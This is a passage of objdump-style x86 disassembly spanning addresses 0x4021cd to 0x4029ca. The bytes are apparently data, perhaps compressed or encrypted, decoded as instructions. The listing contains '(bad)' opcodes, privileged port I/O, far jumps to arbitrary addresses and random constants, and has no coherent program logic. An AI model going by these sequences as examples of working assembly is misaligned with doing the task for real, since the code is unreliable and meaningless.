  4021cd:	stos   BYTE PTR es:[edi],al
  4021ce:	cmp    BYTE PTR [eax+0x5c],ah
  4021d1:	add    dh,bh
  4021d3:	inc    esp
  4021d4:	ja     0x402241
  4021d6:	outs   dx,BYTE PTR ds:[esi]
  4021d7:	and    al,0xe0
  4021d9:	pushf  
  4021da:	adc    ecx,DWORD PTR [edi-0x3a]
  4021dd:	add    esi,ebp
  4021df:	aas    
  4021e0:	fisub  DWORD PTR [edi]
  4021e2:	shl    DWORD PTR [esi-0x7],1
  4021e5:	ror    BYTE PTR [esi+0x24fb9f73],0x57
  4021ec:	mov    edi,0x140a9ce3
  4021f1:	or     ch,BYTE PTR [edx+0x26]
  4021f4:	push   ecx
  4021f5:	cld    
  4021f6:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  4021f8:	add    eax,0x842fc997
  4021fd:	dec    edx
  4021fe:	mov    ebp,0x218802ea
  402203:	leave  
  402204:	jne    0x4021aa
  402206:	push   ecx
  402207:	mov    dh,0x36
  402209:	jle    0x4021eb
  40220b:	mov    esp,0x614d6ca2
  402210:	jmp    0x402219
  402212:	xor    BYTE PTR [esi+edi*8+0x1b],dl
  402216:	das    
  402217:	jno    0x402263
  402219:	and    BYTE PTR [esi],cl
  40221b:	inc    edi
  40221c:	shl    bh,cl
  40221e:	xor    al,0x6f
  402220:	mov    esp,0x5da2fea0
  402225:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402226:	mov    eax,ds:0xe6d771df
  40222b:	sahf   
  40222c:	fdiv   QWORD PTR [eax+0x34]
  40222f:	jle    0x40224e
  402231:	mov    ebp,DWORD PTR [edx-0x5f72a08e]
  402237:	xlat   BYTE PTR ds:[ebx]
  402238:	xchg   esp,eax
  402239:	addr16 cmp eax,0xe2f92867
  40223f:	mov    ch,0xc1
  402241:	icebp  
  402242:	ss xor al,0xf8
  402245:	out    0x3c,eax
  402247:	in     al,0x21
  402249:	aaa    
  40224a:	xlat   BYTE PTR ds:[ebx]
  40224b:	fldenv [esp+edx*1]
  40224e:	fsin   
  402250:	lds    ecx,FWORD PTR [eax+0x1a]
  402253:	test   DWORD PTR [ebp-0x32184a67],esi
  402259:	mov    ds:0xf3218fa5,al
  40225e:	dec    ebx
  40225f:	gs int 0xee
  402262:	mov    ah,0x4e
  402264:	or     cl,dh
  402266:	je     0x4022ce
  402268:	xchg   esp,eax
  402269:	inc    edi
  40226a:	retf   0xd892
  40226d:	or     ebx,DWORD PTR [eax+eax*2-0x1035a947]
  402274:	jnp    0x40226f
  402276:	imul   edi,DWORD PTR [eax],0xd
  402279:	int3   
  40227a:	fucomi st,st(7)
  40227c:	and    DWORD PTR [ebx],eax
  40227e:	inc    ecx
  40227f:	xchg   edx,eax
  402280:	jmp    0x402266
  402282:	loop   0x4022d0
  402284:	inc    ebp
  402285:	lahf   
  402286:	sbb    DWORD PTR [ebx],0xdc0b94ce
  40228c:	das    
  40228d:	inc    edx
  40228e:	mov    al,0xe2
  402290:	push   ebp
  402291:	add    ebx,eax
  402293:	push   esi
  402294:	or     eax,0x5a9f110b
  402299:	and    DWORD PTR [ecx],esi
  40229b:	and    DWORD PTR [esi+0x71e06865],esi
  4022a1:	mov    edx,0xb5d21dd5
  4022a6:	(bad)  
  4022a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4022a8:	and    al,0x6a
  4022aa:	and    eax,0xae6c5af1
  4022af:	in     eax,0x54
  4022b1:	sub    eax,0x9c6a2209
  4022b6:	fwait
  4022b7:	test   ebx,ebx
  4022b9:	dec    ebx
  4022ba:	push   ecx
  4022bb:	and    edi,ecx
  4022bd:	mov    bl,0x6
  4022bf:	sub    eax,0x26865e28
  4022c4:	pop    esp
  4022c5:	add    eax,0x9934e8d1
  4022ca:	inc    ebp
  4022cb:	mov    eax,ds:0xcedaeb12
  4022d0:	fs clc 
  4022d2:	mov    al,ds:0x9935c551
  4022d7:	add    cl,BYTE PTR [edi+0x5c7033b9]
  4022dd:	popa   
  4022de:	aas    
  4022df:	mov    ch,0x86
  4022e1:	dec    esi
  4022e2:	loop   0x402357
  4022e4:	push   es
  4022e5:	daa    
  4022e6:	push   ebx
  4022e7:	jns    0x40226f
  4022e9:	pop    esp
  4022ea:	cmp    eax,0x51bdea61
  4022ef:	inc    ecx
  4022f0:	pop    esi
  4022f1:	or     al,0xa6
  4022f3:	xchg   esp,eax
  4022f4:	and    al,0xde
  4022f6:	adc    esi,DWORD PTR [edi]
  4022f8:	cmp    al,0x55
  4022fa:	inc    ebp
  4022fb:	cmc    
  4022fc:	in     eax,0x84
  4022fe:	outs   dx,BYTE PTR ds:[esi]
  4022ff:	call   0xc87930de
  402304:	xchg   ecx,eax
  402305:	lea    edx,[esi]
  402307:	clc    
  402308:	push   edi
  402309:	out    0x49,al
  40230b:	pop    es
  40230c:	mov    DWORD PTR [esi],edx
  40230e:	test   DWORD PTR [esi+0x4f92e845],0x377182a5
  402318:	retf   
  402319:	cmp    eax,0x3b5916f2
  40231e:	out    dx,al
  40231f:	adc    esi,DWORD PTR [eax]
  402321:	add    al,BYTE PTR [esi]
  402323:	mov    DWORD PTR [edi+0x73c6ec05],0x930fbbde
  40232d:	repz mov ah,0x21
  402330:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402331:	rcr    BYTE PTR [edi+0x4f2ae81c],cl
  402337:	xor    dh,cl
  402339:	das    
  40233a:	fsubr  st,st(5)
  40233c:	cmp    eax,DWORD PTR [ecx+0x5a4af315]
  402342:	push   edi
  402343:	pusha  
  402344:	xchg   esi,eax
  402345:	cmp    ah,BYTE PTR [ebx+0x5b]
  402348:	cmc    
  402349:	ret    0x5823
  40234c:	test   ah,bl
  40234e:	retf   
  40234f:	aad    0x21
  402351:	pop    esi
  402352:	aas    
  402353:	mov    bh,0xcf
  402355:	sar    BYTE PTR [eax+ebx*1+0x30d15746],0x4d
  40235d:	xor    DWORD PTR [ebp-0x13ca593c],edx
  402363:	xchg   DWORD PTR es:[edx+0x297e9916],ecx
  40236a:	xlat   BYTE PTR ds:[ebx]
  40236b:	pusha  
  40236c:	mov    ebx,DWORD PTR [edx]
  40236e:	jg     0x4023b5
  402370:	mov    cl,0xdd
  402372:	test   BYTE PTR [eax-0x6cd192a9],0xb
  402379:	or     al,0x24
  40237b:	retf   
  40237c:	xchg   ecx,eax
  40237d:	cld    
  40237e:	and    BYTE PTR [edx+0x10],bl
  402381:	cmp    eax,0x93970397
  402386:	mov    WORD PTR [ebx],ss
  402388:	pop    es
  402389:	add    DWORD PTR [ecx],ebx
  40238b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40238c:	adc    al,0x3
  40238e:	clc    
  40238f:	scas   eax,DWORD PTR es:[edi]
  402390:	scas   al,BYTE PTR es:[edi]
  402391:	shl    DWORD PTR [edx-0x33],0x71
  402395:	gs or  ecx,esp
  402398:	lock jg 0x40239e
  40239b:	add    cl,BYTE PTR [ebp-0x55]
  40239e:	dec    edi
  40239f:	lahf   
  4023a0:	in     eax,dx
  4023a1:	xor    bl,BYTE PTR [eax]
  4023a3:	jle    0x40237d
  4023a5:	jo     0x4bf6f18b
  4023ab:	aas    
  4023ac:	fstp   TBYTE PTR [edx+eax*1]
  4023af:	mov    ebx,0xb44239a
  4023b4:	aas    
  4023b5:	les    ecx,FWORD PTR ss:[edi-0x7c]
  4023b9:	add    ecx,DWORD PTR [ecx+0x19fd7a63]
  4023bf:	pop    eax
  4023c0:	jb     0x40243d
  4023c2:	lahf   
  4023c3:	(bad)  
  4023c4:	fldcw  WORD PTR [ecx+0x115d2ceb]
  4023ca:	icebp  
  4023cb:	test   DWORD PTR [eax],0xf3e57b86
  4023d1:	pop    ds
  4023d2:	fwait
  4023d3:	gs stc 
  4023d5:	sar    BYTE PTR [eax-0x165974db],1
  4023db:	jno    0x4023d8
  4023dd:	jnp    0x402399
  4023df:	mov    esp,0x618728d3
  4023e4:	push   0x83785f5b
  4023e9:	inc    eax
  4023ea:	mov    dh,0xf4
  4023ec:	mov    edx,0x4b9893e3
  4023f1:	addr16 add al,0x5a
  4023f4:	rcl    BYTE PTR [edx+0x7d131c36],cl
  4023fa:	ret    
  4023fb:	cmp    ah,BYTE PTR [edx+0x13]
  4023fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4023ff:	sbb    eax,0xe49f7ff9
  402404:	daa    
  402405:	pand   mm3,QWORD PTR [ebp-0x2b]
  402409:	test   DWORD PTR [ebp+0x3],esp
  40240c:	fisubr DWORD PTR [ebx+0x41]
  40240f:	lods   al,BYTE PTR ds:[esi]
  402410:	mov    edx,DWORD PTR [ecx-0x50acb8ea]
  402416:	mov    bl,0x50
  402418:	pop    ds
  402419:	stos   BYTE PTR es:[edi],al
  40241a:	inc    esi
  40241b:	or     BYTE PTR [edi],ch
  40241d:	ret    0xf220
  402420:	retf   
  402421:	mov    ebp,0x80a34829
  402426:	nop
  402427:	jge    0x4023f6
  402429:	mov    bh,0x5e
  40242b:	pop    esp
  40242c:	push   ecx
  40242d:	arpl   WORD PTR ds:0xc7c6a746,bx
  402433:	outs   dx,BYTE PTR ds:[esi]
  402434:	idiv   BYTE PTR [esi-0x20aed674]
  40243a:	jo     0x40242d
  40243c:	adc    dl,BYTE PTR [edi-0x54]
  40243f:	lea    eax,[edi+0x9]
  402442:	test   eax,0xe049b3d8
  402447:	ficom  WORD PTR ds:0xe2dc7420
  40244d:	fwait
  40244e:	cs repnz cld 
  402451:	std    
  402452:	icebp  
  402453:	test   al,0x77
  402455:	fist   DWORD PTR [ebx-0x6e]
  402458:	loopne 0x4023e6
  40245a:	adc    bl,BYTE PTR [eax*2+0x327bf2cd]
  402461:	call   0x11e2:0x99b5eeee
  402468:	xchg   ebx,eax
  402469:	and    BYTE PTR [ebx+0xe],bl
  40246c:	adc    al,0x39
  40246e:	inc    ebp
  40246f:	mov    ebx,0x67d537ed
  402474:	mov    ds:0xfd91d766,eax
  402479:	dec    edx
  40247a:	mov    edi,cr0
  40247d:	fs imul esi,eax,0x356ab52e
  402484:	jns    0x4024a2
  402486:	iret   
  402487:	aad    0x14
  402489:	pushf  
  40248a:	rol    DWORD PTR [eax+0x68],0x8b
  40248e:	sub    al,0x8c
  402490:	(bad)  
  402491:	lods   al,BYTE PTR ds:[esi]
  402492:	pop    edx
  402493:	mov    ebx,0xb2d12c28
  402498:	in     al,0xc2
  40249a:	sbb    al,0x1
  40249c:	or     BYTE PTR [esi+0x1a],cl
  40249f:	inc    esi
  4024a0:	mov    edi,DWORD PTR [ebx+0x1fee88ad]
  4024a6:	(bad)  
  4024a8:	sub    al,cl
  4024aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4024ab:	inc    edx
  4024ac:	sahf   
  4024ad:	push   ebp
  4024ae:	push   ds
  4024af:	jbe    0x402438
  4024b1:	fchs   
  4024b3:	and    al,0xf9
  4024b5:	cwde   
  4024b6:	mov    dl,0x9b
  4024b8:	cmp    cl,BYTE PTR [esi-0x3b]
  4024bb:	mov    BYTE PTR ss:[eax],cl
  4024be:	push   ebp
  4024bf:	pop    ss
  4024c0:	push   esi
  4024c1:	dec    ebx
  4024c2:	jp     0x402448
  4024c4:	aad    0x30
  4024c6:	call   0x7a755686
  4024cb:	cmp    DWORD PTR [ebx-0x5a],esi
  4024ce:	jmp    0x594d6f5e
  4024d3:	ins    DWORD PTR es:[edi],dx
  4024d4:	mov    esp,?
  4024d6:	les    esp,FWORD PTR [edi+0x4a56163c]
  4024dc:	xchg   ecx,eax
  4024dd:	mov    al,0xf3
  4024df:	call   0xd9062cb
  4024e4:	js     0x402544
  4024e6:	push   eax
  4024e7:	sub    BYTE PTR [edx+edi*2+0x79],al
  4024eb:	das    
  4024ec:	pushf  
  4024ed:	or     cl,BYTE PTR [esi]
  4024ef:	pop    ss
  4024f0:	mov    ebx,0x85c63d94
  4024f5:	sbb    al,0x6d
  4024f7:	les    edi,FWORD PTR [ebp+edx*1-0x3a]
  4024fb:	jge    0x4024e7
  4024fd:	mov    al,0x81
  4024ff:	push   ebp
  402500:	popa   
  402501:	rcr    bh,0xfd
  402504:	fwait
  402505:	mov    ds:0x446ae37a,al
  40250a:	pop    esi
  40250b:	jmp    0xc5c1:0x44a463a1
  402512:	test   eax,0xcb7826e4
  402517:	loop   0x4024da
  402519:	sub    al,BYTE PTR [ebx-0x5c]
  40251c:	arpl   WORD PTR [eax],di
  40251e:	lods   al,BYTE PTR ds:[esi]
  40251f:	sahf   
  402520:	cld    
  402521:	inc    ebp
  402522:	into   
  402523:	push   ss
  402524:	push   ebx
  402525:	pop    ebp
  402526:	or     eax,0xce99e5c6
  40252b:	outs   dx,DWORD PTR ds:[esi]
  40252c:	jmp    0xc58f572d
  402531:	jbe    0x402575
  402533:	std    
  402534:	je     0x402570
  402536:	or     BYTE PTR [eax+eiz*2],0xf8
  40253a:	cdq    
  40253b:	div    edx
  40253d:	adc    eax,DWORD PTR [esi-0x3b290392]
  402543:	mov    DWORD PTR [edx],esi
  402545:	shr    DWORD PTR [ebp-0x62c1efaf],0xe8
  40254c:	mov    bl,0x35
  40254e:	lods   eax,DWORD PTR ds:[esi]
  40254f:	pop    edi
  402550:	xor    bh,BYTE PTR [si-0x63b3]
  402555:	clc    
  402556:	rep outs dx,DWORD PTR ds:[esi]
  402558:	loop   0x402553
  40255a:	sub    BYTE PTR [esi],0x71
  40255d:	test   eax,0x3abb165f
  402562:	loop   0x40256b
  402564:	xor    BYTE PTR [esi+ebx*1-0x46d120fd],bh
  40256b:	xchg   DWORD PTR [ebp-0x413bbfee],edi
  402571:	cmp    esp,DWORD PTR [ebx]
  402573:	sub    eax,0x6e8e81b0
  402578:	dec    ecx
  402579:	xlat   BYTE PTR ds:[ebx]
  40257a:	call   0x2bb0:0xe4ac1e89
  402581:	mul    DWORD PTR [ecx+0xb]
  402584:	fbstp  TBYTE PTR [edx+ecx*4]
  402587:	xor    bh,bh
  402589:	rcl    DWORD PTR [ebp+0x4db67fdb],1
  40258f:	test   eax,ebx
  402591:	inc    esi
  402592:	in     al,0x9f
  402594:	sub    BYTE PTR [ebp+0x61],bh
  402597:	sti    
  402598:	xor    DWORD PTR [eax],esp
  40259a:	pop    ecx
  40259b:	sbb    eax,DWORD PTR [ebx]
  40259d:	sub    BYTE PTR [ebx+0x7cfb97c7],bl
  4025a3:	jno    0x402623
  4025a5:	mov    edx,0x42676a7
  4025aa:	loope  0x402533
  4025ac:	and    DWORD PTR [edi+ebx*2-0x3c2e61e9],edi
  4025b3:	cli    
  4025b4:	jg     0x4025e9
  4025b6:	xchg   esp,eax
  4025b7:	test   BYTE PTR [ecx+0x1d],ah
  4025ba:	es stos BYTE PTR es:[edi],al
  4025bc:	ret    
  4025bd:	fistp  WORD PTR [esi-0x6e5debaf]
  4025c3:	jmp    0xd109:0x7728c1b0
  4025ca:	dec    ecx
  4025cb:	push   cs
  4025cc:	jle    0x40260a
  4025ce:	sbb    eax,0x9f48696d
  4025d3:	push   cs
  4025d4:	fadd   QWORD PTR [eax-0xbcdd4bf]
  4025da:	test   eax,0x101f8f12
  4025df:	es daa 
  4025e1:	sub    BYTE PTR [edx-0x3a0ce6d],bl
  4025e7:	es mov esi,0xe9a24b72
  4025ed:	sbb    esp,0x44
  4025f0:	mov    ds:0x665b0265,eax
  4025f5:	xor    edx,DWORD PTR [esi+0xa]
  4025f8:	call   0x7d868c3b
  4025fd:	cld    
  4025fe:	aas    
  4025ff:	inc    esp
  402600:	inc    ecx
  402601:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402602:	mov    eax,gs
  402604:	imul   ebx,ecx,0xaefa991c
  40260a:	inc    eax
  40260b:	mov    esp,0xbcbfc14
  402610:	das    
  402611:	dec    ebx
  402612:	jg     0x4025ef
  402614:	in     eax,0xa3
  402616:	inc    ebp
  402617:	dec    esi
  402618:	cmp    bl,BYTE PTR [ebx]
  40261a:	out    dx,al
  40261b:	je     0x4025c5
  40261d:	mov    DWORD PTR [ebx+0x3c],edx
  402620:	xchg   ebx,eax
  402621:	sub    al,0xfc
  402623:	(bad)  
  402625:	push   ecx
  402626:	dec    BYTE PTR [ebx+edx*4]
  402629:	scas   al,BYTE PTR es:[edi]
  40262a:	lahf   
  40262b:	ret    0x9e2f
  40262e:	xor    bl,BYTE PTR [edi+0x7662a66a]
  402634:	leave  
  402635:	lods   al,BYTE PTR ds:[esi]
  402636:	push   ecx
  402637:	cmp    al,0xcf
  402639:	dec    ebp
  40263a:	xchg   ebx,eax
  40263b:	sub    BYTE PTR [edi],0x94
  40263e:	sub    ebp,esp
  402640:	enter  0xf56f,0x19
  402644:	cmp    ch,BYTE PTR [esp+edx*4-0x702d0da2]
  40264b:	or     bl,BYTE PTR [ebx-0xb7a94b7]
  402651:	cld    
  402652:	ins    BYTE PTR es:[edi],dx
  402653:	repz mov ch,BYTE PTR [ebp+ecx*2-0x531ae7e9]
  40265b:	pusha  
  40265c:	mov    ecx,0x118e8e98
  402661:	add    BYTE PTR [ecx],bl
  402663:	ins    BYTE PTR es:[edi],dx
  402664:	sub    al,cl
  402666:	xchg   esi,eax
  402667:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402668:	and    ah,BYTE PTR [edi]
  40266a:	pop    esi
  40266b:	push   edi
  40266c:	push   ebp
  40266d:	sbb    al,0xb5
  40266f:	aaa    
  402670:	in     eax,0x20
  402672:	aas    
  402673:	jge    0x4026ca
  402675:	mov    dl,0xc0
  402677:	in     al,0x2b
  402679:	push   esi
  40267a:	fdivr  QWORD PTR [ecx]
  40267c:	push   esi
  40267d:	es xor edx,esi
  402680:	add    eax,0xb73e7c9c
  402685:	adc    DWORD PTR [esi-0x7724a0d5],esp
  40268b:	xchg   ebp,eax
  40268c:	sub    BYTE PTR [esi-0x3b],0x44
  402690:	dec    ebx
  402691:	cld    
  402692:	repnz push cs
  402694:	mov    ds:0x5a5e319,al
  402699:	xchg   esp,eax
  40269a:	sbb    ebx,DWORD PTR [eax-0x10]
  40269d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40269e:	sbb    al,0xd3
  4026a0:	or     eax,0xc6f22b09
  4026a5:	mov    ebx,0x5ad6d7b9
  4026aa:	test   BYTE PTR [ebx+ebp*1+0x39],bh
  4026ae:	sbb    BYTE PTR [edi+0x29],bl
  4026b1:	inc    esi
  4026b2:	test   DWORD PTR [ebx+edx*4+0x5f896dcf],ebx
  4026b9:	cmc    
  4026ba:	data16 jb 0x40271c
  4026bd:	and    al,0x67
  4026bf:	push   cs
  4026c0:	jo     0x402687
  4026c2:	adc    ebp,DWORD PTR [esi+0x6246171f]
  4026c8:	popa   
  4026c9:	and    eax,esp
  4026cb:	scas   al,BYTE PTR es:[edi]
  4026cc:	xchg   DWORD PTR [esi],edi
  4026ce:	mov    ch,al
  4026d0:	cmp    al,BYTE PTR [esi]
  4026d2:	(bad)  
  4026d3:	pop    eax
  4026d4:	mov    al,ds:0xf9a763f8
  4026d9:	pusha  
  4026da:	pop    esp
  4026db:	ja     0x40272a
  4026dd:	jle    0x402750
  4026df:	mov    BYTE PTR [ebx+0x30],0x1b
  4026e3:	in     al,0xb6
  4026e5:	jo     0x4026d0
  4026e7:	sbb    BYTE PTR [esi+0x5ebe74ac],ah
  4026ed:	ret    
  4026ee:	inc    esi
  4026ef:	add    dl,BYTE PTR [ebp-0x5b6a310c]
  4026f5:	lods   eax,DWORD PTR ds:[esi]
  4026f6:	sub    al,0x3
  4026f8:	push   esi
  4026f9:	jnp    0x40272e
  4026fb:	fwait
  4026fc:	aam    0xe9
  4026fe:	jae    0x4026e8
  402700:	inc    esi
  402701:	xchg   esp,eax
  402702:	or     eax,0xb95f547b
  402707:	pop    ds
  402708:	xor    dh,BYTE PTR [esi+0x34285ef0]
  40270e:	iret   
  40270f:	push   edi
  402710:	shl    ch,0xcc
  402713:	adc    eax,0xf68d250a
  402718:	pop    es
  402719:	cdq    
  40271a:	sbb    al,0x58
  40271c:	dec    ebx
  40271d:	jge    0x40276e
  40271f:	xchg   BYTE PTR [esi+eax*4],dl
  402722:	mov    eax,gs:0x17e6412f
  402728:	rcl    DWORD PTR [edx-0x4a],1
  40272b:	sti    
  40272c:	mov    ebx,0x63f99531
  402731:	mov    dl,BYTE PTR [ebx+eax*4-0x1d7ccbb7]
  402738:	sbb    BYTE PTR [ebx+0x2d],ah
  40273b:	arpl   WORD PTR [eax-0x7a],bx
  40273e:	mov    WORD PTR [ecx-0x267ca1bc],cs
  402744:	xor    al,0x6c
  402746:	sbb    DWORD PTR [eax+0x74],ebp
  402749:	push   es
  40274a:	sar    BYTE PTR [esi+0x69],1
  40274d:	cdq    
  40274e:	data16 aaa 
  402750:	pop    eax
  402751:	int3   
  402752:	xor    DWORD PTR [eax+0x6feba054],0x58
  402759:	adc    eax,0xded25fa9
  40275e:	outs   dx,DWORD PTR ds:[esi]
  40275f:	ss jbe 0x4027a2
  402762:	mov    ds:0x579d19d2,eax
  402767:	out    dx,al
  402768:	and    DWORD PTR [ebx*1+0x5d79f455],eax
  40276f:	jmp    0x5a85eae1
  402774:	push   di
  402776:	xlat   BYTE PTR ds:[ebx]
  402777:	cmp    BYTE PTR [eax+0x29],ch
  40277a:	mov    eax,ds:0x103f1109
  40277f:	ins    BYTE PTR es:[edi],dx
  402780:	sub    eax,esp
  402782:	into   
  402783:	inc    edx
  402784:	sbb    eax,0x64413119
  402789:	cmp    al,0x22
  40278b:	xchg   edx,eax
  40278c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40278d:	xchg   ebx,eax
  40278e:	ins    DWORD PTR es:[edi],dx
  40278f:	mov    bh,0x8a
  402791:	jae    0x4027e4
  402793:	in     al,dx
  402794:	mov    dl,0xe6
  402796:	push   0xffffffbd
  402798:	test   eax,0x556d391
  40279d:	(bad)  
  40279f:	mov    edi,0xd682fff5
  4027a4:	iret   
  4027a5:	rcr    BYTE PTR [ebx+0xe1aaf00],0x97
  4027ac:	out    dx,eax
  4027ad:	sub    al,0x76
  4027af:	in     eax,dx
  4027b0:	sbb    DWORD PTR [ebp+0x6e],esp
  4027b3:	adc    ah,BYTE PTR [eax-0xc67d8b7]
  4027b9:	cmp    dh,al
  4027bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4027bc:	sbb    BYTE PTR [eax+eiz*8+0x52],bl
  4027c0:	ins    DWORD PTR es:[edi],dx
  4027c1:	test   DWORD PTR [eax],ecx
  4027c3:	(bad)  
  4027c4:	sti    
  4027c5:	sahf   
  4027c6:	adc    DWORD PTR [edx+0x7e],esp
  4027c9:	jo     0x402791
  4027cb:	push   0xffffffbe
  4027cd:	jp     0x402830
  4027cf:	sbb    ch,BYTE PTR [bp+di+0x3d]
  4027d3:	and    eax,0x5e6e02be
  4027d8:	and    ch,ah
  4027da:	cmp    BYTE PTR ds:0xed037d8,ah
  4027e0:	call   0xbce:0x1414983
  4027e7:	push   esi
  4027e8:	fidiv  DWORD PTR [eax+edi*2+0x76014e46]
  4027ef:	push   es
  4027f0:	adc    eax,0xab263363
  4027f5:	lea    esp,[ecx]
  4027f7:	sbb    al,0x26
  4027f9:	(bad)  
  4027fa:	and    DWORD PTR [esi+ebp*2+0x168661d5],esi
  402801:	cmp    eax,0x544777aa
  402806:	sbb    BYTE PTR [edx],cl
  402808:	cmp    dh,ah
  40280a:	push   0xd08150f1
  40280f:	jp     0x4027f0
  402811:	arpl   WORD PTR [ebp-0x22496eaa],cx
  402817:	adc    ch,al
  402819:	sbb    bh,BYTE PTR [ecx]
  40281b:	jle    0x40284c
  40281d:	sbb    DWORD PTR [ebx],0x99b1e74b
  402823:	jge    0x4027f3
  402825:	aas    
  402826:	cmp    ch,dl
  402828:	adc    al,0x55
  40282a:	mov    edx,0xb5966964
  40282f:	ret    0x9f00
  402832:	aaa    
  402833:	addr16 aas 
  402835:	lods   al,BYTE PTR ds:[esi]
  402836:	aas    
  402837:	scas   al,BYTE PTR es:[edi]
  402838:	mov    ds:0xf871aefb,al
  40283d:	mov    eax,ds:0xe78d75cb
  402842:	iret   
  402843:	ret    0xd501
  402846:	leave  
  402847:	imul   eax,DWORD PTR [ecx+0x4ef2b533],0x8da0f762
  402851:	ins    BYTE PTR es:[edi],dx
  402852:	jne    0x40287e
  402854:	and    al,0xb
  402856:	jnp    0x4028ad
  402858:	sbb    DWORD PTR [ecx+ebx*1+0x68c398],0x126f5c3d
  402863:	test   BYTE PTR [edx+0x436aff4e],ah
  402869:	inc    ecx
  40286a:	jbe    0x402839
  40286c:	lea    ecx,[esp+ecx*8-0x4e518ed6]
  402873:	loopne 0x402814
  402875:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402876:	dec    ebp
  402877:	add    ch,cl
  402879:	cwde   
  40287a:	push   eax
  40287b:	ret    0xb598
  40287e:	cdq    
  40287f:	jb     0x402817
  402881:	pop    ss
  402882:	ficom  DWORD PTR [ecx-0x285729d2]
  402888:	sbb    ch,BYTE PTR [edx-0x462c42a4]
  40288e:	jae    0x4028af
  402890:	dec    eax
  402891:	and    esi,DWORD PTR [edi]
  402893:	call   0x894e:0xf651ddc8
  40289a:	mov    edx,0x6b34bbe1
  40289f:	ins    BYTE PTR es:[edi],dx
  4028a0:	inc    ebx
  4028a1:	leave  
  4028a2:	inc    ebp
  4028a3:	mov    edx,0xb15a01d7
  4028a8:	jp     0x4028f6
  4028aa:	xchg   edi,eax
  4028ab:	repnz imul esi,esi,0x5d
  4028af:	or     eax,0x673532e0
  4028b4:	call   0x3ed50bf5
  4028b9:	jns    0x402872
  4028bb:	push   ecx
  4028bc:	xor    DWORD PTR [ebp+0x9],ebx
  4028bf:	jnp    0x402904
  4028c1:	sbb    BYTE PTR [ecx+eiz*2-0x70],bl
  4028c5:	pop    ecx
  4028c6:	push   esp
  4028c7:	rcl    BYTE PTR [edi+0x3620aaa],0x90
  4028ce:	or     edi,ecx
  4028d0:	and    ecx,DWORD PTR [ebp-0x2]
  4028d3:	push   cs
  4028d4:	jbe    0x4028e5
  4028d6:	out    dx,al
  4028d7:	call   0xc804:0x25095f05
  4028de:	xor    BYTE PTR [ebx+0x47],0x99
  4028e2:	mov    edi,0x5472f20b
  4028e7:	fld    DWORD PTR [ebx-0x37]
  4028ea:	push   cs
  4028eb:	and    ebp,DWORD PTR [esi]
  4028ed:	push   es
  4028ee:	or     ebx,0xb956597c
  4028f4:	sbb    edx,DWORD PTR [esi+0x12eaeaab]
  4028fa:	int3   
  4028fb:	outs   dx,BYTE PTR ds:[esi]
  4028fc:	push   ebp
  4028fd:	stos   DWORD PTR es:[edi],eax
  4028fe:	(bad)  
  4028ff:	jecxz  0x402929
  402901:	inc    ebx
  402902:	test   BYTE PTR [eax-0x677f541f],ch
  402908:	sub    DWORD PTR [esi-0x65],ebx
  40290b:	stos   BYTE PTR es:[edi],al
  40290c:	push   edx
  40290d:	mov    edi,0x2030451
  402912:	and    DWORD PTR [esi-0x2a],0xc0aab5a5
  402919:	mov    eax,ds:0x499c2364
  40291e:	daa    
  40291f:	dec    ebx
  402920:	add    al,0xcc
  402922:	shl    DWORD PTR [edi+0x63f3d1a6],0xc8
  402929:	lahf   
  40292a:	out    0x58,eax
  40292c:	cmp    dl,ah
  40292e:	aam    0x89
  402930:	jecxz  0x40298f
  402932:	in     al,0x2b
  402934:	je     0x402971
  402936:	xchg   esp,eax
  402937:	jge    0x402993
  402939:	cmp    BYTE PTR ds:0xd3dc8d49,al
  40293f:	jp     0x402930
  402941:	sub    ch,ah
  402943:	outs   dx,DWORD PTR ds:[esi]
  402944:	imul   edx,DWORD PTR [eax],0xffffffb9
  402947:	push   ecx
  402948:	mov    ah,ch
  40294a:	ss mov dh,0x95
  40294d:	leave  
  40294e:	in     eax,dx
  40294f:	in     eax,0x4
  402951:	dec    ebp
  402952:	pusha  
  402953:	repz mov bl,0xe3
  402956:	jmp    0x4028e6
  402958:	push   ds
  402959:	mov    ah,BYTE PTR ds:0x132b4b73
  40295f:	lea    ebp,[edi]
  402961:	rcr    BYTE PTR [ecx-0x3a],cl
  402964:	push   ebx
  402965:	loope  0x4029c7
  402967:	jg     0x402939
  402969:	mov    bh,0x7a
  40296b:	sbb    ebx,DWORD PTR [esi]
  40296d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40296e:	jae    0x40297d
  402970:	fld    QWORD PTR [edi]
  402972:	imul   edx,DWORD PTR [edx+0x3d],0x40
  402976:	pop    ecx
  402978:	and    ecx,DWORD PTR [esi+0x4]
  40297b:	cmp    BYTE PTR [esi+eiz*4-0x4f],cl
  40297f:	sbb    al,0x9f
  402981:	pop    ecx
  402982:	sbb    ch,dh
  402984:	pop    edx
  402985:	mov    ecx,0x7025abba
  40298a:	mov    bl,BYTE PTR [eax+0x48]
  40298d:	xchg   BYTE PTR [di-0x2c59],ah
  402992:	push   0x4
  402994:	out    0xb8,al
  402996:	clc    
  402997:	mov    dl,0xe4
  402999:	test   BYTE PTR ds:[edi+0x21],0x1f
  40299e:	(bad)  [edx-0x4]
  4029a1:	mov    gs,ebp
  4029a3:	cmp    dl,dh
  4029a5:	fcom   st(1)
  4029a7:	imul   ebp,DWORD PTR [esi-0x307d61ab],0x73719c5d
  4029b1:	adc    eax,DWORD PTR [edx+0x1f]
  4029b4:	fbld   TBYTE PTR ds:0xa307f9c5
  4029ba:	jns    0x4029b4
  4029bc:	cld    
  4029bd:	add    BYTE PTR [edx],ch
  4029bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4029c0:	push   eax
  4029c1:	cmc    
  4029c2:	or     ch,dh
  4029c4:	adc    edi,DWORD PTR ds:0x8d060a05
  4029ca:	pop    es
